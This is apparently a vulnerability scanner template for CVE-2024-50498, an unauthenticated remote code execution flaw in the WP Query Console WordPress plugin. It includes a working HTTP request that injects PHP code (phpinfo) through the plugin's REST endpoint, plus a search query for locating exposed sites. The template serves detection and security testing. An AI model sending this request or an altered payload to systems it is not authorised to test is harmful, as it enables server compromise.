id: CVE-2024-50498

info:
  name: WP Query Console <= 1.0 - Remote Code Execution
  author: s4e-io
  severity: critical
  description: |
    The WP Query Console plugin for WordPress is vulnerable to Remote Code Execution in all versions up to, and including, 1.0. This makes it possible for unauthenticated attackers to execute code on the server.
  reference:
    - https://github.com/RandomRobbieBF/CVE-2024-50498
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-query-console/wp-query-console-10-unauthenticated-remote-code-execution
    - https://patchstack.com/database/vulnerability/wp-query-console/wordpress-wp-query-console-plugin-1-0-remote-code-execution-rce-vulnerability?_s_id=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-50498
    cwe-id: CWE-94
    epss-score: 0.00513
    epss-percentile: 0.77296
    cpe: cpe:2.3:a:lubus:wp_query_console:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: lubus
    product: wp_query_console
    framework: wordpress
    fofa-query: body="wp-content/plugins/wp-query-console/"
  tags: cve,cve2024,wp,wordpress,wp-plugin,rce

http:
  - raw:
      - |
        POST /wp-json/wqc/v1/query HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"queryArgs":"phpinfo();","queryType":"post"}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "PHP Extension", "PHP Version")'
          - 'contains(content_type, "application/json")'
          - "status_code == 200"
        condition: and
